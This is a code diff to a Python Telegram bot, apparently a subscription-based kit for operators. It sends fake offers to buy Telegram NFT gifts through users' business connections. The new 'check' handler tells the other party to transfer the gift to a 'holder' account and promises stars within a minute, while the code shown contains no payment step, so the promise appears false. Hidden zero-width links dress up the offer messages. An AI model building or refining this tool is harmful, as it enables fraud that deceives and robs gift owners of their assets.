@@ -1,5 +1,5 @@
 """
-Sulumi Team Bot — Full persistent + anti-freeze
+Sulumi Team Bot — Full persistent + anti-freeze + menu/i18n
 """
 
 import os
@@ -24,6 +24,7 @@ PAYMENT = os.environ.get("PAYMENT", "pantera138382")
 API = f"https://api.telegram.org/bot{BOT_TOKEN}"
 RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://offera-5uqe.onrender.com")
 DB_PATH = os.environ.get("DATABASE_PATH", "sulumi_bot.db")
+LOGO = os.environ.get("LOGO_URL", "")
 
 E = {
     "stars": "5958376256788502078",
@@ -32,6 +33,53 @@ E = {
     "accept": "5776375003280838798",
     "forward": "5832251986635920010",
     "check": "6019523512908124649"
+}
+
+L = {
+    "ru": {
+        "menu_caption": "<b>NFT TEAM</b>\nГлавное меню. Выбери раздел:",
+        "settings": "Настройки",
+        "profile": "Профиль",
+        "admins": "Админы",
+        "settings_title": "<b>Настройки</b>\nВыбери параметр:",
+        "language": "Язык",
+        "currency": "Валюта",
+        "notifications": "Уведомления",
+        "lang_title": "<b>Язык</b>\nВыбери язык интерфейса:",
+        "cur_title": "<b>Валюта</b>\nВыбери валюту офферов:",
+        "on": "вкл",
+        "off": "выкл",
+        "back": "Назад",
+        "profile_title": "<b>Профиль</b>",
+        "holder": "Держатель",
+        "subscription": "Подписка",
+        "stars": "Звёзды",
+        "grams": "Граммы",
+        "admins_title": "<b>Администрация</b>",
+        "notif_accepted": "Твой оффер на {name} #{num} принят. Держатель: @{hold}",
+    },
+    "en": {
+        "menu_caption": "<b>NFT TEAM</b>\nMain menu. Choose a section:",
+        "settings": "Settings",
+        "profile": "Profile",
+        "admins": "Admins",
+        "settings_title": "<b>Settings</b>\nChoose a parameter:",
+        "language": "Language",
+        "currency": "Currency",
+        "notifications": "Notifications",
+        "lang_title": "<b>Language</b>\nChoose interface language:",
+        "cur_title": "<b>Currency</b>\nChoose offer currency:",
+        "on": "on",
+        "off": "off",
+        "back": "Back",
+        "profile_title": "<b>Profile</b>",
+        "holder": "Holder",
+        "subscription": "Subscription",
+        "stars": "Stars",
+        "grams": "Grams",
+        "admins_title": "<b>Admins</b>",
+        "notif_accepted": "Your offer for {name} #{num} was accepted. Holder: @{hold}",
+    },
 }
 
 def ce(name, fb):
@@ -57,6 +105,10 @@ def init_db():
     c.execute("CREATE TABLE IF NOT EXISTS user_settings (user_id INTEGER PRIMARY KEY, lang TEXT, cur TEXT, holder TEXT)")
     c.execute("CREATE TABLE IF NOT EXISTS user_state (user_id INTEGER PRIMARY KEY, state TEXT, updated REAL)")
     c.execute("CREATE TABLE IF NOT EXISTS business_connections (user_id INTEGER PRIMARY KEY, bci TEXT, updated REAL)")
+    try:
+        c.execute("ALTER TABLE user_settings ADD COLUMN notif INTEGER DEFAULT 1")
+    except Exception:
+        pass
     c.execute("INSERT OR IGNORE INTO subscribers (user_id, expires_at) VALUES (?, ?)", (OWNER_ID, -1.0))
     conn.commit()
     conn.close()
@@ -95,16 +147,16 @@ def get_expires_str(uid):
 
 def gs(uid):
     conn = get_db()
-    row = conn.execute("SELECT lang, cur, holder FROM user_settings WHERE user_id = ?", (uid,)).fetchone()
+    row = conn.execute("SELECT lang, cur, holder, notif FROM user_settings WHERE user_id = ?", (uid,)).fetchone()
     conn.close()
     if row:
-        return {"lang": row["lang"] or "ru", "cur": row["cur"] or "stars", "hold": row["holder"] or PAYMENT}
-    return {"lang": "ru", "cur": "stars", "hold": PAYMENT}
+        return {"lang": row["lang"] or "ru", "cur": row["cur"] or "stars", "hold": row["holder"] or PAYMENT, "notif": 1 if row["notif"] is None else row["notif"]}
+    return {"lang": "ru", "cur": "stars", "hold": PAYMENT, "notif": 1}
 
 def save_user_settings(uid, s):
     conn = get_db()
-    conn.execute("INSERT OR REPLACE INTO user_settings (user_id, lang, cur, holder) VALUES (?, ?, ?, ?)",
-                 (uid, s.get("lang", "ru"), s.get("cur", "stars"), s.get("hold", PAYMENT)))
+    conn.execute("INSERT OR REPLACE INTO user_settings (user_id, lang, cur, holder, notif) VALUES (?, ?, ?, ?, ?)",
+                 (uid, s.get("lang", "ru"), s.get("cur", "stars"), s.get("hold", PAYMENT), s.get("notif", 1)))
     conn.commit()
     conn.close()
 
@@ -112,6 +164,10 @@ def set_user_field(uid, key, value):
     s = gs(uid)
     s[key] = value
     save_user_settings(uid, s)
+
+def t(uid, key):
+    lang = gs(uid)["lang"]
+    return L.get(lang, L["ru"]).get(key, L["ru"].get(key, key))
 
 def set_state(uid, state):
     conn = get_db()
@@ -203,6 +259,14 @@ def em(cid, mid, txt, kb=None, bci=None):
     if bci: d["business_connection_id"] = bci
     return api("editMessageText", **d)
 
+def edit_any(cid, mid, txt, kb=None, bci=None):
+    d = {"chat_id": cid, "message_id": mid, "caption": txt, "parse_mode": "HTML"}
+    if kb is not None: d["reply_markup"] = kb
+    if bci: d["business_connection_id"] = bci
+    r = api("editMessageCaption", **d)
+    if r.get("ok"): return r
+    return em(cid, mid, txt, kb=kb, bci=bci)
+
 def ac(cb, t=None, sa=False):
     d = {"callback_query_id": cb, "show_alert": sa}
     if t: d["text"] = t
@@ -211,18 +275,65 @@ def ac(cb, t=None, sa=False):
 def hide_cmd(cid, mid, bci=None):
     res = dm(cid, mid, bci=bci)
     if res.get("ok"): return res
+    desc = (res.get("description") or "").lower()
+    if "not found" in desc: return res
     res2 = em(cid, mid, "?", kb={"inline_keyboard": []}, bci=bci)
     if res2.get("ok"): return res2
+    desc2 = (res2.get("description") or "").lower()
+    if "not found" in desc2: return res2
     return sm(cid, "?", bci=bci)
+
+def menu_kb(uid):
+    return {"inline_keyboard": [
+        [btn(" " + t(uid, "settings"), "menu:settings", "check"), btn(" " + t(uid, "profile"), "menu:profile", "stars")],
+        [btn(" " + t(uid, "admins"), "menu:admins", "forward")]
+    ]}
+
+def settings_kb(uid):
+    s = gs(uid)
+    cur_name = t(uid, "stars") if s["cur"] == "stars" else t(uid, "grams")
+    notif = t(uid, "on") if s["notif"] else t(uid, "off")
+    return {"inline_keyboard": [
+        [btn(f" {t(uid, 'language')}: {s['lang'].upper()}", "set:lang", "check")],
+        [btn(f" {t(uid, 'currency')}: {cur_name}", "set:cur", "stars")],
+        [btn(f" {t(uid, 'notifications')}: {notif}", "set:notif", "accept")],
+        [btn(f" {t(uid, 'back')}", "menu:main", "decline")]
+    ]}
+
+def lang_kb(uid):
+    return {"inline_keyboard": [
+        [btn(" Русский", "setlang:ru", "check"), btn(" English", "setlang:en", "check")],
+        [btn(f" {t(uid, 'back')}", "menu:settings", "decline")]
+    ]}
+
+def cur_kb(uid):
+    return {"inline_keyboard": [
+        [btn(f" {t(uid, 'stars')}", "setcur:stars", "stars"), btn(f" {t(uid, 'grams')}", "setcur:grams", "grams")],
+        [btn(f" {t(uid, 'back')}", "menu:settings", "decline")]
+    ]}
+
+def back_kb(uid, target):
+    return {"inline_keyboard": [[btn(" " + t(uid, "back"), target, "decline")]]}
+
+def profile_txt(uid):
+    s = gs(uid)
+    cur_name = t(uid, "stars") if s["cur"] == "stars" else t(uid, "grams")
+    notif = t(uid, "on") if s["notif"] else t(uid, "off")
+    return (
+        t(uid, "profile_title") + "\n\n"
+        f"ID: <code>{uid}</code>\n"
+        f"{t(uid, 'language')}: {s['lang'].upper()}\n"
+        f"{t(uid, 'currency')}: {cur_name}\n"
+        f"{t(uid, 'notifications')}: {notif}\n"
+        f"{t(uid, 'holder')}: @{s['hold']}\n"
+        f"{t(uid, 'subscription')}: {get_expires_str(uid)}"
+    )
 
 def okb(did):
     return {"inline_keyboard": [[btn(" Отклонить", f"decline:{did}", "decline"), btn(" Принять", f"accept:{did}", "accept")]]}
 
 def aakb(did, h):
     return {"inline_keyboard": [[btn_url(" Передать", f"tg://send_gift?to={h.replace('@', '')}", "forward")], [btn(" Проверить", f"check:{did}", "check")]]}
-
-def confirm_kb(did):
-    return {"inline_keyboard": [[btn("✅ Подтвердить получение", f"confirm:{did}", "accept")]]}
 
 def pnft(t):
     m = re.search(r'(?:https?://)?(?:t\.me/nft/)?([A-Za-z0-9]+-\d+)', t, re.I)
@@ -240,22 +351,36 @@ def process_msg(msg):
         txt = (msg.get("text") or "").strip()
         if not cid or not uid or not txt: return
         if ci: set_bci(uid, ci)
+
+        if txt == "/start":
+            clear_state(uid)
+            cap = t(uid, "menu_caption")
+            kb = menu_kb(uid)
+            sent = None
+            if LOGO:
+                d = {"chat_id": cid, "photo": LOGO, "caption": cap, "parse_mode": "HTML", "reply_markup": kb}
+                if ci: d["business_connection_id"] = ci
+                sent = api("sendPhoto", **d)
+            if not (sent and sent.get("ok")):
+                sm(cid, cap, kb=kb, bci=ci)
+            return
+
         state = get_state(uid)
 
-        if state == "holder":
+        if state == "holder" and not txt.startswith("/"):
             un = txt.lstrip("@").lower()
             if un and " " not in un:
                 set_user_field(uid, "hold", un)
                 clear_state(uid)
                 sm(cid, f"✅ Держатель: @{un}", bci=ci)
             return
-        if state == "lang":
+        if state == "lang" and not txt.startswith("/"):
             if txt.lower() in ["ru", "en"]:
                 set_user_field(uid, "lang", txt.lower())
                 clear_state(uid)
                 sm(cid, f"✅ Язык: {'🇷🇺 RU' if txt.lower() == 'ru' else '🇬🇧 EN'}", bci=ci)
             return
-        if state == "cur":
+        if state == "cur" and not txt.startswith("/"):
             if txt.lower() in ["stars", "grams"]:
                 set_user_field(uid, "cur", txt.lower())
                 clear_state(uid)
@@ -306,7 +431,7 @@ def process_msg(msg):
             nl = f"https://t.me/nft/{ni['slug']}"
             hidden = f'<a href="{nl}">\u200b</a>'
             name = msg["from"].get("first_name") or msg["from"].get("username") or "User"
-            cap = hidden + f"<b>{name}</b>предлагает <b>{pr}</b> {cs} за <b>{ni['name']} #{ni['nfmt']}</b>.\n\n5h 59m на решение."
+            cap = hidden + f"<u>{name}</u> предлагает за подарок <b>{ni['name']} #{ni['nfmt']}</b> сумму <b>{pr}</b> {cs}.\n\nУ вас есть 5h 59m, чтобы принять решение."
             res = sm_nft(cid, cap, nl, kb=okb(did), bci=sender_bci)
             if res.get("ok"):
                 time.sleep(1.5)
@@ -358,50 +483,71 @@ def process_cb(cb):
         data = cb.get("data", "")
         ci = msg.get("business_connection_id")
 
+        if data.startswith("menu:"):
+            act = data.split(":", 1)[1]
+            ac(cbid)
+            if act == "main":
+                edit_any(cid, mid, t(uid, "menu_caption"), menu_kb(uid), ci)
+            elif act == "settings":
+                edit_any(cid, mid, t(uid, "settings_title"), settings_kb(uid), ci)
+            elif act == "profile":
+                edit_any(cid, mid, profile_txt(uid), back_kb(uid, "menu:main"), ci)
+            elif act == "admins":
+                edit_any(cid, mid, t(uid, "admins_title") + f"\n\n@{PAYMENT}", back_kb(uid, "menu:main"), ci)
+            return
+
+        if data.startswith("set:"):
+            act = data.split(":", 1)[1]
+            ac(cbid)
+            if act == "lang":
+                edit_any(cid, mid, t(uid, "lang_title"), lang_kb(uid), ci)
+            elif act == "cur":
+                edit_any(cid, mid, t(uid, "cur_title"), cur_kb(uid), ci)
+            elif act == "notif":
+                s = gs(uid)
+                set_user_field(uid, "notif", 0 if s["notif"] else 1)
+                edit_any(cid, mid, t(uid, "settings_title"), settings_kb(uid), ci)
+            return
+
+        if data.startswith("setlang:"):
+            val = data.split(":", 1)[1]
+            if val in ("ru", "en"):
+                set_user_field(uid, "lang", val)
+            ac(cbid)
+            edit_any(cid, mid, t(uid, "settings_title"), settings_kb(uid), ci)
+            return
+
+        if data.startswith("setcur:"):
+            val = data.split(":", 1)[1]
+            if val in ("stars", "grams"):
+                set_user_field(uid, "cur", val)
+            ac(cbid)
+            edit_any(cid, mid, t(uid, "settings_title"), settings_kb(uid), ci)
+            return
+
         if data.startswith("check:"):
             did = data.split(":", 1)[1]
             deal = get_deal(did)
             if not deal:
-                ac(cbid, txt="❌ Оффер не найден", sa=True)
+                ac(cbid, txt="Оффер не найден", sa=True)
                 return
-            if deal["st"] not in ("accepted", "checking"):
-                ac(cbid, txt="❌ Оффер не активен", sa=True)
+            if deal["st"] in ("declined", "expired"):
+                ac(cbid, txt="Сделка закрыта", sa=True)
                 return
-            if deal["st"] == "checking":
-                ac(cbid, txt="⏳ Уже проверяется", sa=True)
+            if deal["st"] == "completed":
+                ac(cbid, txt="Сделка уже завершена", sa=True)
                 return
-            set_deal_status(did, "checking")
-            ac(cbid)
             nf = fmt(deal["num"])
-            cs = ce("stars", "⭐") if deal["cur"] == "stars" else ce("grams", "💎")
             h = deal["hold"]
-            nl = f"https://t.me/nft/{deal['slug']}"
-            bci = deal.get("bci") or ci
-            hidden = f'<a href="{nl}">\u200b</a>'
-            txt = hidden + f"🔄 <b>Статус: Проверяется передача</b>\n\n"
-            txt += f"Ожидается NFT <b>{deal['name']} #{nf}</b> от @{h}.\n"
-            txt += f"После получения NFT, {deal['price']} {cs} будут разморожены."
-            em(cid, mid, txt, kb=confirm_kb(did), bci=bci)
-            return
-
-        if data.startswith("confirm:"):
-            did = data.split(":", 1)[1]
-            deal = get_deal(did)
-            if not deal or deal["st"] != "checking":
-                ac(cbid, txt="❌ Сделка не активна", sa=True)
-                return
-            set_deal_status(did, "completed")
-            ac(cbid)
-            nf = fmt(deal["num"])
-            cs = ce("stars", "⭐") if deal["cur"] == "stars" else ce("grams", "💎")
-            h = deal["hold"]
-            nl = f"https://t.me/nft/{deal['slug']}"
-            bci = deal.get("bci") or ci
-            hidden = f'<a href="{nl}">\u200b</a>'
-            txt = hidden + f"✅ <b>Сделка успешно завершена!</b>\n\n"
-            txt += f"NFT <b>{deal['name']} #{nf}</b> получен.\n"
-            txt += f"{deal['price']} {cs} отправлены продавцу."
-            em(cid, mid, txt, kb={"inline_keyboard": []}, bci=bci)
+            instr = (
+                f"Ожидается передача подарка {deal['name']} #{nf} на @{h}\n\n"
+                f"Инструкция как передать:\n"
+                f"• Нажмите кнопку «Передать»\n"
+                f"• Зайдите во вкладку «Мои»\n"
+                f"• Выберите ваш NFT и передайте его\n"
+                f"• Звёзды поступят на баланс в течение 1 минуты"
+            )
+            ac(cbid, txt=instr, sa=True)
             return
 
         if data.startswith("accept:"):
@@ -412,9 +558,11 @@ def process_cb(cb):
                 return
             set_deal_status(did, "accepted")
             ac(cbid)
-            cs = ce("stars", "⭐") if deal["cur"] == "stars" else ce("grams", "💎")
             nf = fmt(deal["num"])
             h = deal["hold"]
+            if gs(deal["wid"])["notif"]:
+                sm(deal["wid"], t(deal["wid"], "notif_accepted").format(name=deal["name"], num=nf, hold=h))
+            cs = ce("stars", "⭐") if deal["cur"] == "stars" else ce("grams", "💎")
             nl = f"https://t.me/nft/{deal['slug']}"
             bci = deal.get("bci") or ci
             hidden = f'<a href="{nl}">\u200b</a>'
@@ -457,11 +605,23 @@ def process_update(u):
     except Exception as e:
         logging.error(f"UPDATE ERR: {e}")
 
+seen_updates = {}
+
 @app.route("/webhook", methods=["POST"])
 def webhook():
     u = request.get_json(force=True, silent=True)
-    if u:
-        executor.submit(process_update, u)
+    if not u:
+        return jsonify({"ok": True}), 200
+    upd_id = u.get("update_id")
+    if upd_id is not None:
+        now = time.time()
+        if upd_id in seen_updates:
+            return jsonify({"ok": True}), 200
+        seen_updates[upd_id] = now
+        if len(seen_updates) > 5000:
+            for k in [k for k, v in seen_updates.items() if now - v > 600]:
+                seen_updates.pop(k, None)
+    executor.submit(process_update, u)
     return jsonify({"ok": True}), 200
 
 @app.route("/")
@@ -474,10 +634,11 @@ def set_wh():
 
 def set_cmd():
     api("setMyCommands", commands=[
-        {"command": "buy", "description": "Купить"}, {"command": "tarifs", "description": "Цены"},
-        {"command": "lg", "description": "Язык"}, {"command": "cv", "description": "Валюта"},
-        {"command": "holder", "description": "Держатель"}, {"command": "list", "description": "Список (админ)"},
-        {"command": "zabrat", "description": "Отозвать (админ)"}, {"command": "legitt", "description": "Выдать (админ)"}
+        {"command": "start", "description": "Главное меню"}, {"command": "buy", "description": "Купить"},
+        {"command": "tarifs", "description": "Цены"}, {"command": "lg", "description": "Язык"},
+        {"command": "cv", "description": "Валюта"}, {"command": "holder", "description": "Держатель"},
+        {"command": "list", "description": "Список (админ)"}, {"command": "zabrat", "description": "Отозвать (админ)"},
+        {"command": "legitt", "description": "Выдать (админ)"}
     ])
 
 init_db()
